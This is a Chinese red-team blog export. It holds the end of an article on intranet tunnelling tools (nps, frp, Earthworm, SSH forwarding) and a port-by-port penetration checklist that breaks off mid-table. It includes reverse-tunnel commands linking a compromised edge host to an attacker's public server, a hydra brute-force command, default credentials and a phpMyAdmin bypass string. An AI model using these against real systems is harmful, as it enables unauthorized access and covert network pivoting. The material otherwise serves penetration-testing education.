<p>访问localhost:8080进入后台，账号密码可看nps生成的配置文件。</p>
<p>登录后点击客户端—-新增。</p>
<p>新增后，把nps_client的npc文件丢到边缘机。</p>
<p>执行.&#x2F;npc -server&#x3D;192.168.211.151:8024 -vkey&#x3D;j057rppz4s0in21j -type&#x3D;tcp</p>
<p>命令可以在添加的客户端看到，执行后，会显示设备在线。</p>
<p>第三步：</p>
<p>根据需要建立对应的通道即可。</p>
<p>访问本机3389，就相当于访问内网机器的3389</p>
<h3 id="FRP代理"><a href="#FRP代理" class="headerlink" title="FRP代理"></a><strong>FRP代理</strong></h3><p>frp是一种快速反向代理，可帮助您将NAT或防火墙后面的本地服务器公开到Internet。到目前为止，它支持TCP和UDP以及HTTP和HTTPS协议，在这些协议中，请求可以通过域名转发到内部服务。</p>
<p>首先这个工具有两端，服务端和客户端，服务端部署在我们具有公网IP的服务器上，客户端放在我们拿到权限的跳板服务器上，双端都需要对配置文件进行配置，我们先来完整的看一下双端的配置文件。</p>
<p>SSH服务：</p>
<ol>
<li>服务器一:有公网的ip地址———–边界机开启端口7000，执行命令开始frp服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>内网或者家里的主机—————–内网主机修改配置文件frpc.ini，设置边界机的ip地址，然后执行命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 服务器一的ip地址</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">#把本机（内网主机）的22端口开启代理，通过攻击机的6000端口发送出去</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line">*也可以设置在边缘机上执行frpc。通过设置frpc.ini把内网22端口转发出去</span><br><span class="line">./frpc -c ./frpc.ini  # 启动</span><br><span class="line">3.测试------------外部机器代理边界机的6000端口，即可访问内网的ssh服务ssh -p 6000 test@x.x.x.x</span><br></pre></td></tr></table></figure>



<h3 id="Earthworm代理"><a href="#Earthworm代理" class="headerlink" title="Earthworm代理"></a><strong>Earthworm代理</strong></h3><p>Earthworm代理是一个轻量级功能强大内网穿透工具，基于C开发，该工具能够以在“正向“、”反向“、”多级级联“等方式大同一条网络隧道，直达网络深处，支持Linux，Windows，MacOS，Arm-Linux均包含其内，强烈推荐使用。三大功能：socks5代理、端口转发、端口映射。</p>
<p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">详细参数：</span><br><span class="line">-s 指定链路状态，6种ssocksd  rcsocks  rssocks  lcx_slave  lcx_stran  lcx_listen</span><br><span class="line">-l 本地监听的端口</span><br><span class="line">-d 指定转发或者反弹的主机地址</span><br><span class="line">-e 指定转发或者反弹的主机端口</span><br><span class="line">-f 连接或者映射的主机地址</span><br><span class="line">-g 连接或者映射的主机端口</span><br></pre></td></tr></table></figure>

<p>正向代理：（我–&gt;目标机&#x2F;开端口）（socks的版本是5）</p>
<p>肉鸡：ew -s ssocksd -l 1080（需要在目标机中开启一个端口）</p>
<p>反向代理：（目标机–&gt;我&#x2F;开端口）（8888是建立的隧道，1080是传输数据的端口）</p>
<p>具有公网IP的主机（攻击者机器）：ew -s rcsocks -l 1080 -e 8888（监听端口）</p>
<p>边缘机：ew -s  rssocks -d 攻击者公网主机IP  -e 8888</p>
<h3 id="SSH隧道代理"><a href="#SSH隧道代理" class="headerlink" title="SSH隧道代理"></a><strong>SSH隧道代理</strong></h3><p>转发Ssh有三个强大的端口转发命令，分别是本地转发，远程转发，动态转发。</p>
<h4 id="Socks代理："><a href="#Socks代理：" class="headerlink" title="Socks代理："></a><strong>Socks代理：</strong></h4><p>Ssh -qTfnN -D port remotehost</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数详解：</span><br><span class="line">-C 允许压缩数据</span><br><span class="line">-q 安静模式</span><br><span class="line">-T 不占用shell</span><br><span class="line">-f 后台运行，并推荐加上-n 参数</span><br><span class="line">-N 不执行远程命令</span><br><span class="line">-g 允许远端主机连接本地转发的端口</span><br><span class="line">-n 把stdin 重定向到/dev/null(防止从stdin读取数据)</span><br><span class="line">-L 本地转口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发，即socks代理</span><br><span class="line">-p 指定ssh连接端口</span><br></pre></td></tr></table></figure>

<h4 id="本地转发："><a href="#本地转发：" class="headerlink" title="本地转发："></a><strong>本地转发：</strong></h4><p>远程管理服务器上的mysql，mysql不能直接root用户远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到本地1234端口实现以root用户远程登陆mysql。Ssh -CfNg -L &lt;本机ip&gt;:&lt;本机端口&gt;:&lt;目标B ip&gt;:&lt;目标B端口&gt; 用户名@跳板端口ssh -CfNg -L 1234:127.0.0.1:3306 <a href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#x31;&#56;&#x35;&#46;&#x58;&#88;&#46;&#88;&#88;&#46;&#x31;&#57;">&#114;&#x6f;&#111;&#116;&#x40;&#x31;&#56;&#x35;&#46;&#x58;&#88;&#46;&#88;&#88;&#46;&#x31;&#57;</a></p>
<h4 id="远程转发："><a href="#远程转发：" class="headerlink" title="远程转发："></a><strong>远程转发：</strong></h4><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就可以直接访问到了内网的端口。Ssh -CfNg -R &lt;本地端口&gt;:&lt;目标B ip&gt;:&lt;目标B 端口&gt; 用户名@本地IPssh -CfNg -R 81:127.0.0.1:80 <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#46;&#50;">&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#46;&#50;</a>现在只需要在192.168.1.2这个主机上访问127.0.0.1的81端口就是访问内网服务器的80端口</p>
<h2 id="06-工具特征总结"><a href="#06-工具特征总结" class="headerlink" title="06 工具特征总结"></a>06 工具特征总结</h2><h3 id="Ew："><a href="#Ew：" class="headerlink" title="Ew："></a><strong>Ew：</strong></h3><p>如果利用ew进行全局代理，配合加密得shell，通过流量回溯极难发现，通过服务器本地日志查看，进程查看，网络排查 容易发现痕迹，且ew会被部分查杀软件查杀</p>
<h3 id="reGeorg：-1"><a href="#reGeorg：-1" class="headerlink" title="reGeorg："></a><strong>reGeorg：</strong></h3><p>利用reGeorg方式来进行内网全局代理之后有明显的流量特征，但是流量中的行为不方便分析，流量行为主要是以流量隧道来进行攻击，我们能直观看见的是目的ip和目的端口，所以可以根据端口全球数量和频率可以大概分析攻击者行为，脚本会被部分查杀软件检查</p>
<h3 id="nps：-1"><a href="#nps：-1" class="headerlink" title="nps："></a><strong>nps：</strong></h3><p>轻量级的内网穿透工具，完全采用GO语言实现，服务端界面漂亮简洁。支持tcp、udp流量转发，支持内网http代理、内网socks5代理，同时支持snappy压缩、站点保护、加密传输、多路复用、header修改等。支持web图形化管理，集成多用户模式。但是他有一个致命缺点就是在socks5代理下会长连接一直不放开导致结果不准确。</p>
<h3 id="frp："><a href="#frp：" class="headerlink" title="frp："></a><strong>frp：</strong></h3><p>FRP功能完整，主要采用GO语言实现，重量级的工具，服务端界面样式风格一般。配置繁琐，不同的协议需要配置不同的参数，采用文件存放数据，不支持数据库管理数据。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E4%B8%8E%E4%BB%A3%E7%90%86%E7%9A%84%E4%BA%86%E8%A7%A3%E4%B8%8E%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E6%8E%A8%E8%8D%90/640-16546128751784.png" alt="图片"></p>
<p>转自：银河护卫队super</p>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>代理隧道</tag>
      </tags>
  </entry>
  <entry>
    <title>端口渗透总结</title>
    <url>/posts/cc6ad5b9.html</url>
    <content><![CDATA[<h1 id="端口渗透总结"><a href="#端口渗透总结" class="headerlink" title="端口渗透总结"></a>端口渗透总结</h1><h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p><strong>在前段时间的渗透中，我发现通过端口来进行渗透有时会提升我们的效率，所以才有了这篇文章的诞生；</strong></p>
<p>端口渗透过程中我们需要关注几个问题：</p>
<p>1、 端口的banner信息</p>
<p>2、 端口上运行的服务</p>
<p>3、 常见应用的默认端口</p>
<p>当然对于上面这些信息的获取，我们有各式各样的方法，最为常见的应该就是nmap了吧！我们也可以结合其他的端口扫描工具，比如专门的3389、1433等等的端口扫描工具；</p>
<h2 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h2><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
<p>动态&#x2F;私有：49152-65535，不为服务分配这些端口；</p>
<p>当然这些端口都可以通过修改来达到欺骗攻击者的目的，但是这就安全了吗？攻击者又可以使用什么攻击方式来攻击这些端口呢？</p>
<p>还需要注明的一点是：很多木马工具也有特定的端口，本文并没有涉及到这块的内容，大家可以自己去收集收集！</p>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>在对这些端口进行实战讲解时，我需要先阐述一下我对爆破这个方式的一些看法；爆破：技术最简单，需要的技术能力基本为0，工作效率与网络、硬件等相关，在我看来爆破其实是最强大的攻击方式，特别是结合一些特制的字典，结合社工我们可以在很短的时间达到最大的效果，只不过因为我们的pc或者字典不够强大，所以很多时候我们不能进行一次优秀的爆破攻击；当然现在很多web应用以及服务端口都限制了暴力破解；对于这种做了限制的我们可能就需要利用到本文提到的其他攻击了！</p>
<h1 id="0x01-实战测试"><a href="#0x01-实战测试" class="headerlink" title="0x01 实战测试"></a>0x01 实战测试</h1><h2 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h2><h3 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
<p>默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
<p>攻击方式：</p>
<p>爆破：ftp的爆破工具有很多，这里我推荐owasp的</p>
<p>- </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bruter：https://sourceforge.net/projects/worawita/</span><br></pre></td></tr></table></figure>

<p> 以及msf中ftp爆破模块；</p>
<p>匿名访问：用户名：anonymous  密码：为空或任意邮箱</p>
<p>用户名：FTP       密码：FTP或为空</p>
<p>用户名：USET     密码：pass</p>
<p>当然还有不需要用户名密码直接访问的，一般出现在局域网中；</p>
<p>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</p>
<p>后门技术：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，我们可以使用telnet直接连接；</p>
<p>- </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.freebuf.com/articles/system/34571.html</span><br></pre></td></tr></table></figure>

<p>远程溢出漏洞：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</p>
<p>跳转攻击：（Bounce Attacks）攻击者发送一个FTP”PORT”命令给目标FTP服务器，其中包含该主机的网络地址和被攻击的服务的端口号。这样，客户端就能命令FTP服务器发一个文件给被攻击的服务。这个文件可能包括根被攻击的服务有关的命令（如SMTP,NNTP等）。由于是命令第三方去连接到一种服务，而不是直接连接，就使得跟踪攻击者变得困难，并且还避开了基于网络地址的访问限制。（注：此种情况小白并没有遇到过，只是总结一下，欢迎大牛指教）</p>
<h3 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h3><p>nfs：网络文件系统，允许网络中的计算机通过TCP&#x2F;IP网络共享资源。基于Linux系统，配置方面很简单。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
<p>默认端口：2049</p>
<p>攻击方式：</p>
<p>未授权访问：未限制IP以及用户权限设置错误</p>
<h3 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h3><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
<p>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破工具采用hydra）hydra -l username -P<br>PassFile IP smb</p>
<p>未授权访问：给予public用户高权限</p>
<p>远程代码执行漏洞：CVE-2019-0240等等</p>
<h3 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h3><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
<p>默认端口：389</p>
<p>攻击方式：</p>
<p>注入攻击：盲注</p>
<p>未授权访问：</p>
<p>爆破：弱口令</p>
<h2 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h2><h3 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h3><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
<p>默认端口：22</p>
<p>攻击方式</p>
<p>爆破：弱口令、</p>
<p>漏洞：28退格漏洞、OpenSSL漏洞</p>
<h3 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h3><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
<p>默认端口：23</p>
<p>攻击方式</p>
<p>爆破：弱口令</p>
<p>嗅探：此种情况一般发生在局域网；</p>
<h3 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h3><p>远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
<p>默认端口：3389</p>
<p>攻击方式：</p>
<p>爆破：3389端口爆破工具就有点多了</p>
<p>Shift粘滞键后门：5次shift后门</p>
<p>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；</p>
<h3 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h3><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
<p>默认端口：5900+桌面ID（5901；5902）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>认证口令绕过：</p>
<p>拒绝服务攻击：（CVE-2015-5239）</p>
<p>权限提升：（CVE-2013-6886）</p>
<h3 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h3><p>PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
<p>默认端口：5632</p>
<p>攻击方式：</p>
<p>提权控制服务：</p>
<p>拒绝服务攻击：</p>
<h2 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h2><p>HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
<h3 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h3><p>默认端口：80&#x2F;81&#x2F;443</p>
<p>攻击方式：</p>
<p>IIS<br>PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</p>
<p>短文件名泄漏：这种一般没啥影响</p>
<p>解析漏洞：详细见apache服务</p>
<h3 id="Apache-x2F-Tomcat-x2F-Nginx-x2F-Axis2"><a href="#Apache-x2F-Tomcat-x2F-Nginx-x2F-Axis2" class="headerlink" title="Apache&#x2F;Tomcat&#x2F;Nginx&#x2F;Axis2"></a>Apache&#x2F;Tomcat&#x2F;Nginx&#x2F;Axis2</h3><p>默认端口：80&#x2F;8080</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破manager后台）</p>
<p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</p>
<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><p>默认端口：7001</p>
<p>攻击方式：</p>
<p>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</p>
<p>Congsole后台部署webshell：</p>
<p>Java反序列化：</p>
<p>泄漏源代码&#x2F;列目录：这个太老了，估计网上都没有了吧！</p>
<p>SSRF窥探内网：央视网SSRF可窥探内网</p>
<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><p>默认端口8080；其他端口1098&#x2F;1099&#x2F;4444&#x2F;4445&#x2F;8080&#x2F;8009&#x2F;8083&#x2F;8093</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破jboss系统后台）</p>
<p>远程代码执行：由于配置不当造成</p>
<p>Java反序列化：</p>
<h3 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h3><p>默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p>
<p>攻击方式：</p>
<p>爆破：弱口令（控制台）</p>
<p>任意文件泄漏：（CVE-2014-0823）</p>
<p>Java反序列化</p>
<h3 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h3><p>默认端口：http 8080；IIOP 3700；控制台4848</p>
<p>攻击方式：</p>
<p>爆破：弱口令（对于控制台）</p>
<p>任意文件读取：</p>
<p>认证绕过：</p>
<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p>默认端口：8080、8089</p>
<p>攻击方式：</p>
<p>爆破：弱口令（默认管理员）</p>
<p>未授权访问：</p>
<p>反序列化：</p>
<h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><p>默认端口：8080</p>
<p>攻击方式：</p>
<p>目录遍历</p>
<p>远程文件读取</p>
<h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><p>默认端口：8080</p>
<p>攻击方式：</p>
<p>远程共享缓冲区溢出</p>
<h3 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h3><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
<p>默认端口：1352</p>
<p>攻击方式：</p>
<p>爆破：弱口令（admin password）控制台</p>
<p>信息泄露</p>
<p>跨站脚本攻击</p>
<h2 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h2><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。</p>
<h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><p>默认端口：3306</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>身份认证漏洞：CVE-2012-2122</p>
<p>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</p>
<p>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</p>
<h3 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h3><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
<p>攻击方式：</p>
<p>爆破：弱口令&#x2F;使用系统用户</p>
<h3 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h3><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>注入攻击；</p>
<p>漏洞攻击；</p>
<h3 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<p>默认端口：5432</p>
<p>攻击方式：</p>
<p>爆破：弱口令：postgres postgres</p>
<p>缓冲区溢出：CVE-2014-2669</p>
<h3 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h3><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；</p>
<p>默认端口：27017</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问；github有攻击代码</p>
<h3 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h3><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt">https://yunpan.cn/cYjzHxawFpyVt</a>  访问密码 e547</p>
<p>默认端口：6379</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问+配合ssh key提权；</p>
<h3 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h3><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>命令注入：</p>
<h3 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h3><p>默认端口：5000</p>
<p>攻击方式：</p>
<p>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</p>
<h2 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h2><h3 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<p>默认端口：25（smtp）、465（smtps）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问</p>
<h3 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h3><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p>
<p>攻击方式：</p>
<p>爆破；弱口令</p>
<p>未授权访问；</p>
<h3 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h3><p>默认端口：143（imap）、993（imaps）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>配置不当</p>
<h2 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h2><h3 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h3><p>默认端口：53</p>
<p>攻击方式：</p>
<p>区域传输漏洞</p>
<p>见2中的总结</p>
<h3 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h3><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p>
<p>攻击方式：</p>
<p>DHCP劫持；</p>
<h3 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h3><p>默认端口：161</p>
<p>攻击方式:</p>
<p>爆破：弱口令</p>
<h2 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h2><h3 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h3><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
<p>默认端口：2181</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<h3 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h3><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
<p>默认端口：8069</p>
<p>攻击方式：</p>
<p>远程命令执行：</p>
<h3 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h3><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p>
<p>默认端口：9200（）、9300（）</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<p>远程命令执行；</p>
<p>文件遍历；</p>
<p>低版本webshell植入；</p>
<h3 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h3><p>R服务：TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。</p>
<p>默认端口：512（remote process execution）；513（remote login a la<br>telnet）；514（cmd）</p>
<p>攻击方式：</p>
<p>使用rlogin直接登录对方系统；</p>
<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI：我们使用这两个端口很少的原因是因为必须是java，而且rmi穿越防火墙并不好穿越；这里我不会去涉及其他的东西，这里提出RMI只是因为在前段时间的java反序列化中，我们的小伙伴Bird写过一个weblogic利用工具，里面涉及到了RMI的一些东西，在有的时候使用socket不能成功时，我们可以使用RMI方式来进行利用；</p>
<p>默认端口：1090（）、1099（）</p>
<p>攻击方式：</p>
<p>远程命令执行（java反序列化，调用rmi方式执行命令）</p>
<p>这就是RMI的魅力了！</p>
<h3 id="Rsync服务"><a href="#Rsync服务" class="headerlink" title="Rsync服务"></a>Rsync服务</h3><p>Rsync：类UNIX系统下的数据备份工具（remote sync），属于增量备份；关于它的功能，大家自行百度百科吧，其实上面很多大家也看到了说是端口渗透，其实就是端口对应服务的渗透，服务一般出错就在配置或者版本问题上，rsync也不例外。Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。</p>
<p>默认端口：873</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<p>本地提权：rsync默认以root运行，利用rsync上传一个文件，只要这个文件具有s权限，我们执行我们的攻击脚本就可以具有root权限。</p>
<h3 id="Socket代理"><a href="#Socket代理" class="headerlink" title="Socket代理"></a>Socket代理</h3><p>默认端口：1080</p>
<p>Socket代理针对代理来说没有什么漏洞，一般只是在渗透过程中作为我们的代理，进入内网，或者渗透域和林的时候有帮助。这里不做过多描述，但是可以尝试爆破一下代理的用户名和密码，万一运气好能登录，不也~~~~</p>
<h1 id="0x02-总结两句"><a href="#0x02-总结两句" class="headerlink" title="0x02 总结两句"></a>0x02 总结两句</h1><h2 id="图解端口渗透"><a href="#图解端口渗透" class="headerlink" title="图解端口渗透"></a>图解端口渗透</h2><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>攻击技巧</th>
</tr>
</thead>
<tbody><tr>
<td>21&#x2F;22&#x2F;69</td>
<td>ftp&#x2F;tftp：文件传输协议</td>
<td>爆破 嗅探溢出；后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh：远程连接</td>
<td>爆破 OpenSSH；28个退格</td>
</tr>
<tr>
<td>23</td>
<td>telnet：远程连接</td>
<td>爆破 嗅探</td>
</tr>
<tr>
<td>25</td>
<td>smtp：邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名系统</td>
<td>DNS区域传输DNS劫持DNS缓存投毒DNS欺骗深度利用：利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td>67&#x2F;68</td>
<td>dhcp</td>
<td>劫持欺骗</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
